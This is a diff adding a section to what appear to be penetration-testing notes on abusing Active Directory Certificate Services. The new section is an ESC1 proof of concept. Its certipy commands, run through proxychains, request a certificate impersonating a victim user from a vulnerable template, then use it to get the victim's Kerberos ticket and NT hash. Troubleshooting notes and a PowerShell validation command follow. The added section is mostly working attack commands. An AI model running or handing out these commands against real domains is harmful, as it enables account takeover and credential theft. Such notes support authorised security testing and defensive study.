@@ -70,6 +70,20 @@ Note: You have to change the KRB5CCNAME variable to the target users tgt ccache 
 export KRB5CCNAME=/full/path/to/admin_tgt.ccache
 ```
 
+## ESC 1 POC using Certipy
+The following example uses the tool certipy to request a certificate of a victim user using the ESC1 vulnerable template. In this case the nameserver and dns-tcp are specified, due to proxifying the DNS queries over SOCKS proxy:   
+`proxychains certipy req -u user1@domain.local -target ca-server.domain.local -k -ca 'Demo Issuing CA' -template SomeBrokenTemplate -upn victimuser@domain.local -ns 10.0.1.2 -dns-tcp -timeout 10 -debug`   
+
+Once you have the pfx file for the user, authenticate to get the Kerberos ticket (ccache file) and NT hash of the victim user:   
+`proxychains certipy auth -pfx victimuser.pfx -dc-ip 10.0.0.1`   
+
+**Some Notes**   
+ - The target of the certipy req command must be the CA, not the DC!
+ - The CA name has to be the exact same as in the output of e.g. certipy find command. If it contains spaces, use quotes. 
+   Example: `certipy req -u user1@domain.local -target ca-server.domain.local -k -ca 'Demo Issuing CA' -template SomeBrokenTemplate -upn victimuser@domain.local -ns 10.0.1.2 -dns-tcp -timeout 10 -debug`
+ - If the certipy auth using pfx returns the error `[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`, this means the target DC does not have Smart Card Auth enabled or is missing the relevant certificate. In this case try to e.g. use LDAPS. You can verify the validity of the pfx file for example using Lee Christensens "Get-LdapCurrentUser"(https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1) PowerShell function:
+   `Get-LdapCurrentUser -Server 10.0.0.1:636 -Certificate C:\users\bob\desktop\victimuser.pfx -UseSSL [-AuthType Kerberos]`
+
 ## Relaying On Linux
 
 Relaying incoming SMB/HTTP connection to ADCS to generate a certificate on
